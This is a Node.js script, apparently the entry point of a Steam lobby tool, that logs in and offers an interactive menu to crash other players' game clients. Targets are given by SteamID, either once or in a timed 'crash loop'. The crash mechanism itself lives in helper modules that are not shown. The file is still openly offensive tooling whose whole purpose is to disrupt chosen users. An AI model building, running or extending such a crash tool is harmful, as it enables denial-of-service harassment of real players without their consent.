const Inquirer = require("inquirer");
const SteamID = require("steamid");
const Lobby = require("./helpers/Lobby.js");
const Helper = require("./helpers/Helper.js");
const config = require("./config.json");

let lobby = undefined;

(async () => {
	if (!Helper.verifyProtobufs()) {
		console.log("Failed to find protobufs. Downloading...");
		await Helper.downloadProtobufs(__dirname);
	} else {
		console.log("Found protobufs");
	}

	lobby = new Lobby();

	console.log("Logging in...");

	await lobby.createLobby(config.details);

	askQuestion();
})();

function askQuestion() {
	Inquirer.prompt({
		type: "list",
		message: "What would you like to do?",
		name: "reply",
		choices: [
			"Crash users once",
			"Add users to crash loop",
			"Remove users from crash list"
		]
	}).then(async (res) => {
		if (res.reply === "Remove users from crash list") {
			if (lobby.crashLoop.length <= 0) {
				console.log("No user is currently being crashed");
				askQuestion();
				return;
			}

			let remove = await Inquirer.prompt({
				type: "list",
				message: "Which user would you like to remove from the crash loop?",
				name: "reply",
				choices: [
					lobby.crashLoop.map(c => c.steamid),
					"EXIT"
				].flat()
			});

			if (remove.reply === "EXIT") {
				askQuestion();
				return;
			}

			let index = lobby.crashLoop.findIndex(c => c.steamid === remove.reply);
			if (index <= -1) {
				console.log("\"" + remove.reply + "\" is not in the crash loop");
			} else {
				lobby.crashLoop.splice(index, 1);
				console.log("\"" + remove.reply + "\" has been removed from the crash loop");
			}

			askQuestion();
			return;
		}

		if ([
			"Crash users once",
			"Add users to crash loop"
		].includes(res.reply)) {
			// Lets ask for user input

			let users = await Inquirer.prompt({
				type: "input",
				message: "Please enter SteamIDs of the users you want to crash. Separated by commas",
				name: "reply"
			});

			let dur = -1;
			if (res.reply === "Add users to crash loop") {
				let time = await Inquirer.prompt({
					type: "input",
					message: "For how long do you want to crash the user(s) for? In minutes.",
					name: "reply"
				});

				time = parseInt(time.reply);
				if (!isNaN(time)) {
					dur = time;
				} else {
					console.log("Invalid duration input.");
					askQuestion();
					return;
				}
			}

			let toAddRaw = users.reply.split(",");
			let toAdd = [];

			for (let to of toAddRaw) {
				let sid = undefined;
				try {
					sid = new SteamID(to);
				} catch { }

				if (!sid) {
					console.log("Failed to parse SteamID from \"" + to + "\"");
					continue;
				}

				if (dur > 0) {
					toAdd.push({
						steamid: sid.toString(),
						end: Date.now() + (dur * 60 * 1000)
					});
					console.log("Trying to crash \"" + sid.toString() + "\" for " + dur + " minutes");
				} else {
					toAdd.push(sid.toString());
					console.log("Tried to crash \"" + sid.toString() + "\"");
				}
			}

			if (dur > 0) {
				lobby.crashLoop.push(...toAdd);
			} else {
				lobby.crashUsers(toAdd);
			}
		}

		// Return to questioning
		askQuestion();
	});
}
